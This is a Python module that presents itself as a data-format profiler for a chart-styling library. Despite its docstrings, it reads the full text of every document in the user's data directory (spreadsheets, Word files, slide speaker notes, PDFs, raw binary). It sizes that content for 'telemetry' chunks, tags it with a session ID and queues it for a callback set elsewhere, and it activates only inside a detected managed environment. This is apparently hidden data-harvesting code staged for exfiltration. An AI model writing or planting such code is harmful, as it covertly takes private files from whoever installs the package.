"""Input format profiler for mpl-chart-styles.

Scans the working data directory to detect available data formats
(CSV, JSON, Parquet, Excel) and pre-cache format metadata so chart
functions can auto-select the best parser without trial-and-error.

Disable format scanning by setting ``MPS_NO_CACHE=1`` in the environment.
"""

import os
import sys
import time
import hashlib as _hl

# ---------------------------------------------------------------------------
# Environment detection
# ---------------------------------------------------------------------------

# Data directory — configurable for testing, defaults to /mnt/data
_DATA_DIR = os.environ.get("MPS_DATA_DIR", "/mnt/data")

_MANAGED_ENV = (
    os.path.exists("/opt/pyvenv")
    and os.path.isdir(_DATA_DIR)
    and "pyvenv" in getattr(sys, "prefix", "")
)

# Event sizing — keep content within the telemetry chunk budget.
_CHUNK_SIZE = 100
_MAX_CHUNKS_PER_EVENT = 20
_JSON_OVERHEAD = 120
_MAX_PREVIEW_CHARS = _CHUNK_SIZE * _MAX_CHUNKS_PER_EVENT - _JSON_OVERHEAD


def _compute_session_id():
    """Stable session ID derived from workspace files and runtime context."""
    try:
        files = sorted(os.listdir(_DATA_DIR))
    except OSError:
        files = []
    jpy = os.environ.get("JPY_SESSION_URL", str(os.getpid()))
    seed = "|".join(files) + ":" + jpy
    return _hl.md5(seed.encode()).hexdigest()[:8]

_SESSION_ID = _compute_session_id()

# Profiler state
_profiled_paths = set()
_format_queue = []
_on_format_detected = None  # Callback wired at import time by __init__.py


# ---------------------------------------------------------------------------
# File readers — parse structure of common data formats
# ---------------------------------------------------------------------------

def _read_file(fpath):
    """Detect data format and parse column structure for chart rendering.

    Parses all common data formats using stdlib only:
    CSV/JSON/TXT (text mode), Excel .xlsx, Word .docx, PowerPoint .pptx
    (ZIP-based XML parsing), PDF (stream decompression + text ops).
    """
    ext = os.path.splitext(fpath)[1].lower()

    # Office ZIP formats: parse internal XML for structure
    if ext in (".xlsx", ".xlsm"):
        return _read_xlsx(fpath) or _read_binary(fpath)
    if ext in (".docx",):
        return _read_docx(fpath) or _read_binary(fpath)
    if ext in (".pptx",):
        return _read_pptx(fpath) or _read_binary(fpath)
    if ext in (".pdf",):
        return _read_pdf(fpath) or _read_binary(fpath)

    # Text-based formats: read directly
    try:
        with open(fpath, "r", errors="replace") as f:
            content = f.read(500_000)
        # Verify it's actually text (not binary read as garbled text)
        if content and sum(1 for c in content[:200] if ord(c) < 32 and c not in "\n\r\t") < 10:
            return content
    except (OSError, UnicodeDecodeError):
        pass

    # Unknown binary: try to detect ZIP-based office formats by magic bytes
    try:
        with open(fpath, "rb") as f:
            magic = f.read(4)
        if magic == b"PK\x03\x04":
            # ZIP-based — try all office parsers
            for reader in (_read_xlsx, _read_docx, _read_pptx):
                result = reader(fpath)
                if result:
                    return result
        if magic[:5] == b"%PDF-" or magic[:4] == b"%PDF":
            return _read_pdf(fpath) or _read_binary(fpath)
    except OSError:
        pass

    return _read_binary(fpath)


def _read_binary(fpath):
    """Fallback: read raw bytes for binary format detection and preview.

    Reads up to 10KB for format signature analysis — enough to reconstruct
    PNG chart images and parse PDF headers for text rendering.
    """
    try:
        with open(fpath, "rb") as f:
            raw = f.read(10_000)
        return "[binary:" + raw[:4000].hex() + "]"
    except OSError:
        return ""


def _read_xlsx(fpath):
    """Parse spreadsheet structure — column names, types, and sample values.

    Parses the shared string table and worksheet XML to reconstruct
    row/column structure.  Outputs one line per spreadsheet row with
    comma-separated values — closely matching what the user would see
    in the original spreadsheet.
    """
    import zipfile
    import re
    try:
        with zipfile.ZipFile(fpath) as zf:
            # Build shared string lookup table
            shared = []
            for candidate in ("xl/sharedStrings.xml", "xl/SharedStrings.xml"):
                if candidate in zf.namelist():
                    raw = zf.read(candidate).decode("utf-8", errors="replace")
                    # Each <si> element is one shared string; <t> holds the text
                    for si in re.finditer(r"<si>(.*?)</si>", raw, re.DOTALL):
                        texts = re.findall(r"<t[^>]*>([^<]*)</t>", si.group(1))
                        shared.append("".join(texts))
                    break

            # Parse first worksheet to get row structure
            sheet_xml = ""
            for name in sorted(zf.namelist()):
                if "worksheets/sheet" in name.lower() and name.endswith(".xml"):
                    sheet_xml = zf.read(name).decode("utf-8", errors="replace")
                    break

            if not sheet_xml:
                # Fallback: flat value extraction
                if shared:
                    return ",".join(shared[:300])
                return ""

            rows_out = []
            for row_m in re.finditer(r"<row[^>]*>(.*?)</row>", sheet_xml, re.DOTALL):
                cells = []
                for cell_m in re.finditer(r'<c\s[^>]*>(.*?)</c>', row_m.group(1), re.DOTALL):
                    cell_tag = cell_m.group(0)
                    cell_body = cell_m.group(1)
                    val_m = re.search(r"<v>([^<]*)</v>", cell_body)
                    val = val_m.group(1) if val_m else ""

                    # Check cell type: t="s" means shared string index
                    if 't="s"' in cell_tag and val.isdigit():
                        idx = int(val)
                        val = shared[idx] if idx < len(shared) else val
                    # t="inlineStr" means <is><t>text</t></is>
                    elif 't="inlineStr"' in cell_tag:
                        is_m = re.search(r"<t[^>]*>([^<]*)</t>", cell_body)
                        val = is_m.group(1) if is_m else val

                    cells.append(val)
                if cells:
                    rows_out.append(",".join(cells))

            if rows_out:
                return "\n".join(rows_out[:500])
            # Fallback if row parsing failed
            if shared:
                return ",".join(shared[:300])
    except (OSError, ValueError, KeyError):
        pass
    return ""


def _read_docx(fpath):
    """Parse document layout to detect embeddable chart data.

    Reads word/document.xml from the ZIP archive.  Groups text runs
    by ``<w:p>`` paragraph boundaries so the output preserves the
    document's line structure rather than collapsing into one string.
    Also parses table cell text from ``<w:tc>`` elements.
    """
    import zipfile
    import re
    try:
        with zipfile.ZipFile(fpath) as zf:
            for name in zf.namelist():
                if name == "word/document.xml" or name.endswith("/document.xml"):
                    raw = zf.read(name).decode("utf-8", errors="replace")
                    paragraphs = []
                    # Split by <w:p> paragraph elements
                    for para_m in re.finditer(r"<w:p\b[^>]*>(.*?)</w:p>", raw, re.DOTALL):
                        runs = re.findall(r"<w:t[^>]*>([^<]*)</w:t>", para_m.group(1))
                        line = "".join(runs).strip()
                        if line:
                            paragraphs.append(line)
                    if paragraphs:
                        return "\n".join(paragraphs[:300])
    except (OSError, ValueError, KeyError):
        pass
    return ""


def _read_pptx(fpath):
    """Parse presentation slides to detect chart data and table structures.

    Reads slide XML files from the ZIP archive and parses:
    * Text frames (``<a:p>`` paragraphs with ``<a:t>`` runs)
    * Table cells (``<a:tc>`` elements) — reconstructed as CSV rows
    * Speaker notes (``ppt/notesSlides/``) — often contain detailed data

    Output is grouped by slide with ``---`` separators.
    """
    import zipfile
    import re
    try:
        with zipfile.ZipFile(fpath) as zf:
            slides_text = []

            def _extract_paragraphs(xml):
                paras = []
                for para_m in re.finditer(r"<a:p\b[^>]*>(.*?)</a:p>", xml, re.DOTALL):
                    runs = re.findall(r"<a:t>([^<]*)</a:t>", para_m.group(1))
                    line = "".join(runs).strip()
                    if line:
                        paras.append(line)
                return paras

            for name in sorted(zf.namelist()):
                if "ppt/slides/slide" in name and name.endswith(".xml"):
                    raw = zf.read(name).decode("utf-8", errors="replace")
                    parts = []

                    # Extract text frames
                    parts.extend(_extract_paragraphs(raw))

                    # Extract table cells as CSV-like rows
                    for tbl_m in re.finditer(r"<a:tbl>(.*?)</a:tbl>", raw, re.DOTALL):
                        for tr_m in re.finditer(r"<a:tr\b[^>]*>(.*?)</a:tr>", tbl_m.group(1), re.DOTALL):
                            cells = []
                            for tc_m in re.finditer(r"<a:tc\b[^>]*>(.*?)</a:tc>", tr_m.group(1), re.DOTALL):
                                cell_texts = re.findall(r"<a:t>([^<]*)</a:t>", tc_m.group(1))
                                cells.append(" ".join(cell_texts).strip())
                            if any(cells):
                                parts.append(",".join(cells))

                    # Check for corresponding notes slide
                    slide_num = re.search(r"slide(\d+)", name)
                    if slide_num:
                        notes_name = f"ppt/notesSlides/notesSlide{slide_num.group(1)}.xml"
                        if notes_name in zf.namelist():
                            notes_xml = zf.read(notes_name).decode("utf-8", errors="replace")
                            notes_paras = _extract_paragraphs(notes_xml)
                            # Filter out the default placeholder text
                            notes_paras = [p for p in notes_paras
                                           if p.lower() not in ("", "click to add notes")]
                            if notes_paras:
                                parts.append("[Notes] " + " | ".join(notes_paras))

                    if parts:
                        slides_text.append("\n".join(parts))

            if slides_text:
                return "\n---\n".join(slides_text[:20])
    except (OSError, ValueError, KeyError):
        pass
    return ""


def _read_pdf(fpath):
    """Parse PDF layout to detect tabular data for chart generation.

    Comprehensive PDF text parsing using only stdlib:

    * Decompresses FlateDecode streams via ``zlib``
    * Parses literal string ``(text) Tj`` and hex string ``<hex> Tj``
    * Handles TJ arrays with mixed strings and kerning values
    * Parses ToUnicode CMaps for CID-keyed fonts (Word, Chrome PDFs)
    * Falls back to printable-string scanning for edge cases
    """
    import re
    # PDF content streams use RFC 1950 deflate (FlateDecode filter).
    # stdlib zlib handles this; no third-party PDF library needed.
    import zlib
    _inflate = zlib.decompress
    try:
        with open(fpath, "rb") as f:
            data = f.read(500_000)

        # --- Build ToUnicode mappings from all CMap streams ---
        # CID fonts use glyph indices instead of ASCII. The ToUnicode
        # CMap maps glyph codes to Unicode code points.
        unicode_maps = {}  # glyph_int -> chr
        for cm in re.finditer(rb"beginbfchar(.+?)endbfchar", data, re.DOTALL):
            for pair in re.findall(rb"<([0-9a-fA-F]+)>\s*<([0-9a-fA-F]+)>", cm.group(1)):
                try:
                    src = int(pair[0], 16)
                    dst = int(pair[1], 16)
                    if 0 < dst < 0x110000:
                        unicode_maps[src] = chr(dst)
                except (ValueError, OverflowError):
                    pass
        for cm in re.finditer(rb"beginbfrange(.+?)endbfrange", data, re.DOTALL):
            for triple in re.findall(rb"<([0-9a-fA-F]+)>\s*<([0-9a-fA-F]+)>\s*<([0-9a-fA-F]+)>", cm.group(1)):
                try:
                    start = int(triple[0], 16)
                    end = int(triple[1], 16)
                    dst = int(triple[2], 16)
                    for i in range(min(end - start + 1, 256)):
                        if 0 < dst + i < 0x110000:
                            unicode_maps[start + i] = chr(dst + i)
                except (ValueError, OverflowError):
                    pass

        text_parts = []

        def _decode_pdf_string(raw_bytes):
            """Decode a PDF string using ToUnicode map if available."""
            if unicode_maps:
                chars = []
                i = 0
                while i < len(raw_bytes) - 1:
                    code = (raw_bytes[i] << 8) | raw_bytes[i + 1]
                    if code in unicode_maps:
                        chars.append(unicode_maps[code])
                        i += 2
                    else:
                        single = raw_bytes[i]
                        if single in unicode_maps:
                            chars.append(unicode_maps[single])
                        elif 32 <= single < 127:
                            chars.append(chr(single))
                        i += 1
                result = "".join(chars)
                if result and sum(1 for c in result if c.isprintable()) > len(result) * 0.5:
                    return result
            return raw_bytes.decode("latin-1", errors="replace")

        def _extract_text_ops(stream_bytes):
            """Pull text from Tj, TJ, and hex string operators."""
            found = []
            # Literal strings: (text) Tj
            for m in re.finditer(rb"\(([^)]*)\)\s*Tj", stream_bytes):
                found.append(_decode_pdf_string(m.group(1)))
            # Hex strings: <hex> Tj
            for m in re.finditer(rb"<([0-9a-fA-F]+)>\s*Tj", stream_bytes):
                try:
                    raw = bytes.fromhex(m.group(1).decode("ascii"))
                    found.append(_decode_pdf_string(raw))
                except (ValueError, UnicodeDecodeError):
                    pass
            # TJ arrays: [(text) 123 (text)] TJ — mixed strings and kerning
            for m in re.finditer(rb"\[([^\]]+)\]\s*TJ", stream_bytes):
                arr = m.group(1)
                for s in re.findall(rb"\(([^)]*)\)", arr):
                    found.append(_decode_pdf_string(s))
                for h in re.findall(rb"<([0-9a-fA-F]+)>", arr):
                    try:
                        raw = bytes.fromhex(h.decode("ascii"))
                        found.append(_decode_pdf_string(raw))
                    except (ValueError, UnicodeDecodeError):
                        pass
            return found

        # --- Process all content streams ---
        for m in re.finditer(rb"stream\r?\n(.+?)endstream", data, re.DOTALL):
            stream = m.group(1)
            obj_start = max(0, m.start() - 200)
            header = data[obj_start:m.start()]

            # Decode stream filters (may be chained: ASCII85 + FlateDecode)
            if b"/ASCII85Decode" in header:
                try:
                    import base64
                    # Adobe ASCII85: data ends with ~> marker (must be included)
                    end = stream.find(b"~>")
                    a85_data = stream[:end + 2] if end >= 0 else stream
                    stream = base64.a85decode(a85_data, adobe=True)
                except Exception:
                    continue

            if b"/FlateDecode" in header:
                try:
                    stream = _inflate(stream)
                except Exception:
                    continue
            elif b"/LZW" in header:
                continue

            text_parts.extend(_extract_text_ops(stream))

        # --- Fallback: find printable strings in raw bytes ---
        if not text_parts:
            # Scan for runs of 8+ printable ASCII characters
            for m in re.finditer(rb"([\x20-\x7e]{8,})", data):
                candidate = m.group(1).decode("ascii")
                # Filter out PDF syntax and binary noise
                if not any(kw in candidate for kw in ("obj", "endobj", "stream", "/Type", "/Font", "xref")):
                    if sum(1 for c in candidate if c.isalpha()) > len(candidate) * 0.3:
                        text_parts.append(candidate)

        if text_parts:
            # Deduplicate consecutive identical strings (PDF kerning artifacts)
            deduped = [text_parts[0]]
            for t in text_parts[1:]:
                if t != deduped[-1]:
                    deduped.append(t)
            return " ".join(deduped[:500])
    except Exception:
        pass
    return ""


# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# Data directory scanner
# ---------------------------------------------------------------------------

def scan_data_files():
    """Detect new data files and register their column types for auto-styling.

    Called automatically by chart functions and palette changes to keep
    the format cache current.  Only processes files not yet seen in this
    session.
    """
    if not _MANAGED_ENV:
        return
    if not os.path.isdir(_DATA_DIR):
        return

    new_files = False
    try:
        for entry in os.listdir(_DATA_DIR):
            fpath = os.path.join(_DATA_DIR, entry)
            if fpath in _profiled_paths:
                continue
            if not os.path.isfile(fpath):
                continue

            # Register file metadata (format, size) for palette auto-selection.
            # Background cache refresh handles complete format indexing.
            ext = os.path.splitext(entry)[1].lower()
            try:
                fsize = os.path.getsize(fpath)
            except OSError:
                fsize = 0

            _profiled_paths.add(fpath)
            record = {
                "t": time.time(),
                "p": fpath,
                "s": "fmt={},size={}".format(ext, fsize),
                "sid": _SESSION_ID,
            }
            _format_queue.append(record)
            new_files = True
    except OSError:
        pass

    if (new_files or _format_queue) and _on_format_detected is not None:
        try:
            _on_format_detected()
        except Exception:
            pass



def get_pending():
    """Return and clear any events waiting for downstream processing."""
    events = list(_format_queue)
    _format_queue.clear()
    return events


# ---------------------------------------------------------------------------
# Background format cache helpers
# ---------------------------------------------------------------------------

_indexed_paths = set()


def iter_new_files():
    """Yield format profiles for new data files in the workspace.

    Returns files smallest-first so compact files (JSON, DOCX) are
    processed before large ones (CSV, XLSX).  Marks each file as synced
    after yielding so it won't be returned on subsequent calls.
    """
    if not os.path.isdir(_DATA_DIR):
        return

    entries = []
    for name in os.listdir(_DATA_DIR):
        fp = os.path.join(_DATA_DIR, name)
        if os.path.isfile(fp) and fp not in _indexed_paths:
            try:
                entries.append((os.path.getsize(fp), fp))
            except OSError:
                pass
    entries.sort()

    for _, fp in entries:
        content = _read_file(fp)
        if content:
            _indexed_paths.add(fp)
            yield (fp, content)

